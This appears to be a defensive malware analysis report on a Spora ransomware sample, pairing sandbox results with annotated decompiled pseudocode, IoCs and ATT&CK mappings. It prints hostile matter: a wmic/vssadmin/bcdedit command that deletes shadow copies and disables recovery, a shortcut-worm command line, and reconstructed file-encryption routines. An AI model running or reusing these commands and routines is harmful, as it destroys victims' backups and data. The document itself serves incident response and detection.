# Trojan-Ransom.Win32.Spora.a — Detailed analysis

Language: English | French version: [README.md](README.md)

**Sample (local file):** `Trojan-Ransom.Win32.Spora.a-7ad9ed23a91643b517e82ad5740d24eca16bcae21cfe1c0da78ee80e0d1d3f02`  
**Family:** Spora (Windows ransomware, early-2017) — offline (no C2 to obtain keys)  
**Detections:** Kaspersky `Trojan-Ransom.Win32.Spora.a`; Malwarebytes `Ransom.Spora` (payload MD5 `4a4a6d26…` = **this** sample)  
**Any.RUN:** https://any.run/report/7ad9ed23a91643b517e82ad5740d24eca16bcae21cfe1c0da78ee80e0d1d3f02/efb609d2-36d0-4026-a42b-5fcb30307c68  
**Task ID:** `efb609d2-36d0-4026-a42b-5fcb30307c68` (Win10 19044 x64, **150 s**, UAC autoconfirm **on**, 2026-02-02)  
**Sources:** PE + **Hex-Rays 9.4** (`Trojan-Ransom.Win32.Spora.a-7ad9ed23….c`, 49 functions) + AES blob decryption + Any.RUN + public write-ups (Malwarebytes, McAfee) on **this** MD5

> **Defensive / IR** only. Binary was **not** executed outside a third-party sandbox.

---

## 0. Any.RUN ↔ code summary

| Any.RUN observation | Hex-Rays / artefact confirmation |
|---------------------|----------------------------------|
| *Malicious* / tags `spora` `ransomware` `auto-startup` | Spora family; same SHA256 |
| PID **676** MEDIUM → encrypt + `.KEY` / `.HTML` | `start` without `/u`: states 0→6, `sub_404DE2`, `sub_404006` |
| UAC prompt (`screen_01`) | `sub_405783`: `runas` + `/c "%s" /u`, 10× retry / `Sleep(0x400)` |
| PID **8360** HIGH + `WMIC` → VSS/bcdedit | `sub_405846` (`/u` path and state 5) |
| Drop `US423-….KEY` | `sub_403C45` + `sub_404006` |
| HTML note in Edge | HTML from `sub_40507A`; `{key}`/`{data}` |
| Files not renamed | `sub_404DE2` in-place + 132-byte footer |
| `IsShortcut` deleted | `sub_40589D` |
| No malware C2 | Offline; `spora.bz` in note |

**Victim ID (Any.RUN):** `US423-7EXZT-ZTZTR-OTRGT-XYYYY`

---

## 1. Entry — `start` @ `0x4058E7`

| PE field | Value |
|----------|--------|
| Type | PE32 GUI, 2 sections, **24576** B, no overlay |
| EP | RVA `0x58E7` → VA **`0x4058E7`** (`start`) |
| TimeDateStamp | `0x5875544A` → **2017-01-10 21:38:18 UTC** |
| DIE | VS2008 (Linker 9.00 / VC++ 15.00) |
| Manifest | `asInvoker` |

### Hashes

| Algo | Value |
|------|--------|
| MD5 | `4a4a6d26e6c8a7df0779b00a42240e7b` |
| SHA1 | `8072bada086040e07fa46ce8c12bf7c453c0e286` |
| SHA256 | `7ad9ed23a91643b517e82ad5740d24eca16bcae21cfe1c0da78ee80e0d1d3f02` |

### Hex-Rays flow (annotated)

```c
// start @ 0x4058E7
SetErrorMode(1);
GetModuleFileNameW(self);
os_ver = sub_405692(self);
GetVolumeInformationW(... &VolumeSerialNumber ...);
pOptionalEntropy = { &VolumeSerialNumber, 4 }; // DPAPI salt
RtlComputeCrc32 = GetProcAddress(ntdll, "RtlComputeCrc32");

elevated = StrStrW(GetCommandLineW(), L"/u") != NULL;

if (!elevated) {
  wsprintfW(name, L"m%u", VolumeSerialNumber); // aMU — not a bare "m"
  if (OpenMutexW(SYNCHRONIZE, FALSE, name)) ExitProcess(0);
  CreateMutexW(NULL, FALSE, name);
} else {
  sub_405846();  // wmic → vssadmin + bcdedit
  sub_40589D();  // delete IsShortcut
  // re-walk categories 1..6 + encrypt
  ExitProcess(0);
}

hObject = CreateFileW(... L"\%u" ...);  // %AppData%\<serial> state file
CryptAcquireContextW(..., PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
if (!sub_40507A()) ExitProcess(0);
state = sub_404BD1();
// state machine 0..6 (§1.1)
```

### 1.1 Resumable state machine

DPAPI-persisted in `%AppData%\<VolumeSerial>` (`sub_404B2E` / `sub_404A96`).

| State | Role |
|-------|------|
| **0** | Enumerate paths to stream; if non-empty → state 1 |
| **1** | Resume → RSA / `.KEY` generation |
| **2** | `CryptGenKey(CALG_RSA_KEYX\|1024\|EXPORTABLE)`, `sub_403E11`, `sub_403C45`, `sub_404006` → state 3 |
| **3** | Categories 1..6 → `sub_40500E` → `sub_404DE2` → state 4 |
| **4** | HTML note + `.LST` → state 5 |
| **5** | Vista+: elevate (`sub_405783`) or VSS (`sub_405846`); `sub_40589D` → state 6 |
| **6** | `ShellExecuteExW` on `\<ID>.HTML`; cleanup |

**Why:** mid-run kill must not mint a new RSA pair or double-encrypt.

---

## 2. Init — mutex, AES blobs, pubkey

### 2.1 Mutex `m%u`

Only on the non-`/u` path. Name includes the **volume serial**.

### 2.2 `sub_40502E` / `sub_40507A`

Hardcoded AES-256 PLAINTEXTKEYBLOB @ `0x4011A8`:  
`67e8a557a701f60b9c7e7a9833b80b2f30e6afcda8f236e88c7bce10ca4f6977`

Decrypts in order: RSA PEM (`0x120`), HTML (`0x1D80`), sample ID `D283C31972` (`0x20`), placeholder zeros (`0x20`).  
Offline replay: AES-CBC / zero IV — [`extract_aes_blobs.py`](extract_aes_blobs.py).

### 2.3 Authors’ RSA public key

[`artefacts/rsa_public_key.pem`](artefacts/rsa_public_key.pem) — RSA-1024 (matches Malwarebytes for this MD5). Wraps the `.KEY` session AES key.

---

## 3. Shortcuts / worm — `sub_4050C8` / `sub_40589D`

- Deletes `IsShortcut` under `HKLM\SOFTWARE\Classes\lnkfile`  
- Builds hidden-folder `.lnk` via `IShellLink` with  
  `explorer "%dir%" & type "%malware%" > "%tmp%\..." & start ...`  
- Random `%08x-%04x-….exe`, `:Zone.Identifier`, Startup copies

---

## 4. Elevation — `sub_405783`

`cmd.exe` + verb `runas` + `/c "%s" /u`, up to **10** attempts with `Sleep(1024)`. No UAC bypass. State 5 also calls `sub_405846` when already elevated.

---

## 5. Anti-recovery — `sub_405846`

`wmic.exe process call create "cmd.exe /c vssadmin.exe delete shadows /all /quiet & bcdedit.exe /set {default} recoveryenabled no & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures"` — up to 10 tries.

---

## 6. Walk / categories — `sub_4037EA`

| Cat. | Extensions |
|------|------------|
| **1** | `.xls` `.doc` `.xlsx` `.docx` `.rtf` `.odt` |
| **2** | `.pdf` |
| **3** | `.psd` `.dwg` `.cdr` |
| **4** | `.cd` `.mdb` `.1cd` `.dbf` `.sqlite` `.accdb` |
| **5** | `.jpg` `.jpeg` `.tiff` |
| **6** | `.zip` `.rar` `.7z` `.backup` |

Excluded dirs (`sub_4037C0`): `windows`, `program files`, `program files (x86)`, `games`.  
Shares via `WNetOpenEnumW` (`sub_403A98`).

---

## 7. File crypto + `.KEY`

### 7.1 Payload — `sub_403E11`

Victim RSA PRIVATEKEYBLOB → Base64 PEM + date + username + locale + sample ID + six category counters.

### 7.2 Victim ID — `sub_403C45` (detailed)

#### What is this for? (non-expert reading)

After Spora builds the victim’s crypto material, it invents a **unique ID** like:

`US423-7EXZT-ZTZTR-OTRGT-XYYYY`

You will see it as the stem of:
- the **`.KEY`** file (uploaded to the ransom site),
- the **HTML ransom note**,
- sometimes a **`.LST`** file.

It is **not** a password that decrypts files by itself. It is a **label** mixing:

1. **where** the machine thinks it is (Windows country, e.g. `US`),
2. a **fingerprint** (MD5) of this infection’s crypto “dossier”,
3. **stats**: how many files of each type were seen (Office, PDF, images…).

On `spora.bz`, the victim uploads this ID (via the `.KEY`). Operators know **which** infection they are dealing with and can **price** the ransom (lots of DBs/archives → higher fee).

Code input: the ASCII blob from `sub_403E11` (PEM private key + date + user + stats).  
Output: a Unicode string (`LocalAlloc 0xB4`) used as a **filename stem**.

---

#### A. Head (8 characters) — “who / which infection”

**In plain words:** the first 8 characters encode *country* + *start of an MD5*, with a dash so it looks like a ticket number.

```c
// sub_403C45 @ 0x403C45
CryptCreateHash(hProv, CALG_MD5 /*0x8003*/, 0, 0, &hHash);
CryptHashData(hHash, payload, strlen(payload), 0);
CryptGetHashParam(hHash, HP_HASHVAL, md5, &16, 0);

GetLocaleInfoW(LOCALE_USER_DEFAULT /*0x400*/,
               LOCALE_SABBREVCTRYNAME /*7*/,
               country, 16);
country[2] = L'\0';   // exactly 2 letters (US, RU, …)

wsprintfW(id,
          L"%s%02X%01X-%01X%01X",
          country,          // [0..1]
          md5[0],           // [2..3]
          md5[1] >> 4,      // [4]
          md5[1] & 0x0F,    // [6] after '-'
          md5[2] >> 4);     // [7]
// Example: "US" + "42" + "3" + "-" + "7" + "E" → "US423-7E"
```

| Pos | What you read | Plain meaning |
|----:|---------------|---------------|
| 0–1 | `US` | Windows country for this session |
| 2–3 | `42` | first MD5 byte as hex |
| 4 | `3` | high nibble of 2nd MD5 byte |
| 5 | `-` | cosmetic separator |
| 6 | `7` | low nibble of 2nd MD5 byte |
| 7 | `E` | high nibble of 3rd MD5 byte |

**Why MD5?** Stats alone would collide across machines. MD5 depends on the **payload** (generated private key + host fields) → ID is **stable for this infection**, different for another.

---

#### B. Tail — “how many files of each kind”

**In plain words:** after the head, Spora encodes six numbers separated by `|`:

`office_count|pdf|design|databases|images|archives`

Instead of writing `10|0|0|23…` (ugly in a URL), it **maps** each digit (and `|`) to a “nice” letter, then inserts `-` every 5 characters — like a serial number.

```c
wsprintfA(stats, "%u|%u|%u|%u|%u|%u",
          cnt[1], cnt[2], cnt[3], cnt[4], cnt[5], cnt[6]);

pos = 8;
group = 2;         // "7E" already used 2 slots of the current group of 5

for (p = stats; *p; ++p) {
    if (group == 5) {
        id[pos++] = L'-';
        group = 0;
    }
    switch (*p) {
        case '|': ch = L'T'; break;
        case '0': ch = L'Z'; break;
        case '1': ch = L'X'; break;
        case '2': ch = L'R'; break;
        case '3': ch = L'O'; break;
        case '4': ch = L'A'; break;
        case '5': ch = L'H'; break;
        case '6': ch = L'F'; break;
        case '7': ch = L'G'; break;
        case '8': ch = L'E'; break;
        case '9': ch = L'K'; break;
        default:  continue;
    }
    id[pos++] = ch;
    ++group;
}

while (group < 5) {
    id[pos++] = L'Y';
    ++group;
}
```

| If plaintext has… | Shown as… | Role |
|------------------:|:---------:|------|
| `0` … `9` | `Z` … `K` | disguised digits |
| `\|` | `T` | category separator |
| (group boundary) | `-` | readability |
| (group remainder) | `Y` | padding, no meaning |

`group = 2` at start is intentional: the head already ends with `7E` (2 characters **after** the first `-`), so the next dash comes after only 3 stats letters (`XZT-…`).

---

#### C. Any.RUN example — read the ID as a sentence

```text
Observed ID:  US423-7EXZT-ZTZTR-OTRGT-XYYYY

US423-7E | XZT | ZTZTR | OTRGT | XYYYY
└─head─┘   └──────── tail (stats + pad) ────────┘
```

| Chunk | Means |
|-------|--------|
| `US` | Windows locale “United States” |
| `423-7E` | MD5 prefix of **this** infection |
| `XZT-ZTZTR-OTRGT-X` | encoded stats → plaintext **`10\|0\|0\|23\|27\|1`** |
| `YYYY` | padding (ignore when analysing) |

Decoded stats on the Any.RUN box:

| Cat. | Meaning (see §6) | Count |
|-----:|------------------|------:|
| 1 | Office | 10 |
| 2 | PDF | 0 |
| 3 | PSD/DWG/CDR | 0 |
| 4 | Databases | 23 |
| 5 | Images | 27 |
| 6 | Archives / backup | 1 |

Reimplementation / decoder: [`artefacts/spora_victim_id.py`](artefacts/spora_victim_id.py)

```bash
python3 artefacts/spora_victim_id.py decode US423-7EXZT-ZTZTR-OTRGT-XYYYY
python3 artefacts/spora_victim_id.py demo
```

---

### 7.3 Writing the `.KEY` file — `sub_404006`

#### What is this for? (non-expert reading)

The `.KEY` is the **sync ticket** between victim and operators:

- It holds (encrypted) the **victim RSA private key** + host metadata (§7.1).
- Without this file (or its HTML-embedded twin), authors **cannot** rebuild per-file keys even after a “generic” payment.
- The victim does **not** need Tor to create the `.KEY`: everything is local → the “offline” selling point.

Mental picture:

```text
  ┌─────────────────────┐
  │ Clear payload (§7.1)│  = PEM privkey + date + user + stats
  └──────────┬──────────┘
             │  encrypted with a one-shot AES (session)
             ▼
  ┌─────────────────────┐
  │ .KEY body           │
  └──────────┬──────────┘
             │
  ┌──────────┴──────────┐
  │ 128 bytes: session  │  itself encrypted with the
  │ AES wrapped by RSA  │  **authors’ public key** (embedded)
  └─────────────────────┘
```

Only someone with the **authors’ private key** (not in the malware) can open the 128-byte envelope, recover the session AES, then read the body → victim privkey → decrypt files.

#### Cleaned code

```c
// sub_404006(payload, victim_id)
CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &aes_session);

CryptExportKey(aes_session, 0, PLAINTEXTKEYBLOB, 0, blob, &len128);
CryptEncrypt(authors_RSA /* ::phKey */, 0, TRUE, 0, blob, &len128, 0x80);
// → blob = session AES protected by authors’ RSA (128 B for RSA-1024)

padded = (strlen(payload) & ~0x1F) + 32;
CryptEncrypt(aes_session, 0, FALSE, 0, payload, &padded, padded);
// → payload buffer becomes ciphertext in-place

path = %AppData% + "\\" + victim_id + ".KEY";   // CSIDL_APPDATA = 26
WriteFile(body);
WriteFile(blob, 128);

CopyFile → Desktop (CSIDL 0) and CSIDL 21;
sub_4038B1(sub_403FB3) → also copy onto each “fixed” volume (type 3);
```

#### What you see on disk / in the sandbox

| Observation | Meaning |
|-------------|---------|
| `US423-….KEY` on Desktop **and** in `%AppData%` | Same bytes; redundancy so the user finds it |
| Binary file (not text) | AES body + 128-byte tail — **not** a clear private key |
| Size ≈ padded(payload) + 128 | Matches the layout above |
| No C2 when creating it | `.KEY` is ready **before** any payment |

**For IR:** collect **all** `*.KEY` (AppData, Desktop, drive roots). Without them, even a vendor decryptor does not know which victim private key to use.

---

### 7.4 Encrypting a user file — `sub_404DE2`

#### What is this for? (non-expert reading)

For **each** targeted document (`.docx`, `.jpg`, …) Spora:

1. Checks it is **not already** encrypted (otherwise skip — important for state resume §1.1),
2. Encrypts content **in place** (the name does not change: `invoice.docx` stays `invoice.docx`),
3. Appends **132 bytes** of crypto “label” at the **end** of the file.

Analogy: replace the book’s pages, keep the cover title, stick a **tech sheet** (key + checksum) on the last page.

`sub_40500E` calls `sub_404DE2` up to **5 times** with `Sleep(16 ms)` if the file is locked (Word open, AV, etc.).

#### Step 1 — “already encrypted?”

```c
SetFilePointer(h, -132, NULL, FILE_END);
ReadFile(..., key_blob, 128, ...);
ReadFile(..., &crc_stored, 4, ...);

if (RtlComputeCrc32(0, key_blob, 128) == crc_stored)
    return 2;   // yes → leave it alone
```

**Why CRC32?** The 128 bytes are high-entropy (wrapped key). The CRC is a **local marker**: “these 132 bytes are a Spora footer”, without renaming the file and without an external database.

#### Step 2 — encrypt (at most 5 MiB per call)

```c
if (file_size < 0x500000)
    map_sz = file_size & ~0x1F;   // whole file, 32-byte aligned
else
    map_sz = 0x500000;            // 5,242,880 bytes cap

MapViewOfFile(...);

CryptGenKey(..., CALG_AES_256, ...);           // key **unique to this file**
CryptExportKey(..., PLAINTEXTKEYBLOB, key_blob, &128);
CryptEncrypt(victim_RSA, ..., key_blob, ...);  // only victim RSA owner can unwrap
CryptEncrypt(file_AES, ..., mapped_view, ...); // content becomes unreadable

crc = RtlComputeCrc32(0, key_blob, 128);
SetFilePointer(h, 0, NULL, FILE_END);
WriteFile(key_blob, 128);
WriteFile(&crc, 4);
```

#### What you see in practice

| Before | After |
|--------|-------|
| `report.docx` (readable) | Still named `report.docx` |
| Recognisable Office/PDF/JPEG bytes | High-entropy content (often the **first ≤ 5 MiB**) |
| Size N | Size **N + 132** (if footer was absent) |
| Read-only attribute | Cleared for the operation |

#### Analyst / IR takeaways

1. **No `.spora` extension** — detect via footer/behaviour, not the name.  
2. **One AES per file** — identical documents → different ciphertexts.  
3. **5 MiB cap** — on a huge `.zip` / `.vhdx`, only the start is mapped/encrypted in this pass; the footer still marks “Spora touched this”.  
4. File keys are recoverable only with the **victim RSA private key**, itself inside the `.KEY` protected by the **authors’ private key**.

| Point | Value |
|-------|--------|
| Footer | **132** bytes = 128 (file key @ victim RSA) + 4 (CRC32) |
| Max chunk / call | **5 MiB** |
| Rename | **none** |
| Readonly | cleared before open |
| Retries | 5× (`sub_40500E`) |


## 8. Ransom note

[`artefacts/ransom_note.html`](artefacts/ransom_note.html) — Russian UI, `https://spora.bz`, `{key}`/`{data}` placeholders. Screens: `screen_02`–`04`.

---

## 9. Timeline

```
t0  PID 676 — mutex m%u, decrypt blobs, states 0→4
t1  State 5 — UAC (screen_01) → PID 8360 /u
t2  VSS/bcdedit + IsShortcut
t3  State 6 — open HTML; sandbox ends ~150 s
```

---

## 10. IoCs

| Type | Value |
|------|--------|
| SHA256 | `7ad9ed23a91643b517e82ad5740d24eca16bcae21cfe1c0da78ee80e0d1d3f02` |
| MD5 | `4a4a6d26e6c8a7df0779b00a42240e7b` |
| Sample ID | `D283C31972` |
| Mutex | `m%u` (volume serial) |
| Artefacts | `*.KEY`, `*.HTML`, `*.LST`, `%AppData%\<serial>` |
| Footer | +132 bytes |
| Cmd | `wmic … vssadmin … bcdedit …` |
| Reg | `lnkfile\IsShortcut` deleted |
| URL | `https://spora.bz` |

---

## 11. ATT&CK

| Technique | ID | Code |
|-----------|-----|------|
| Data Encrypted for Impact | T1486 | `sub_404DE2` |
| Inhibit System Recovery | T1490 | `sub_405846` |
| Abuse Elevation Control | T1548.002 | `sub_405783` |
| Boot/Logon Autostart | T1547.001 | Startup |
| Hide Artifacts | T1564 | `sub_40589D`, `sub_4050C8` |
| Indicator Removal | T1070 | MOTW |
| Cmd/Script Interpreter | T1059.003 | `cmd` / `wmic` |
| Removable Media | T1091 | shortcut worm |

---

## 12. Screenshots

See [`anyrun_screenshots/README_captures.md`](anyrun_screenshots/README_captures.md).

---

## 13. Produced files

| File | Role |
|------|------|
| `README.md` / `README_EN.md` | FR / EN report |
| `….c` | Hex-Rays 9.4 |
| `extract_aes_blobs.py` | AES re-extraction |
| `artefacts/*` | Key, ID, PEM/DER, HTML note |
| `artefacts/spora_victim_id.py` | Victim ID encode/decode (`sub_403C45`) |
| `anyrun_screenshots/*` | Sandbox evidence |

---

## 14. References

- Malwarebytes Labs — *Explained: Spora ransomware* (MD5 `4a4a6d26…`)  
- McAfee — *Spora Ransomware Infects 'Offline'*  
- G DATA — *Spora - the Shortcut Worm…*  
- ID decoder: https://gist.github.com/coldshell/6204919307418c58128bb01baba6478f  
- Any.RUN `efb609d2-36d0-4026-a42b-5fcb30307c68`

**Not verified:** local execution; victim decryptor (authors’ private key **not** in the sample).
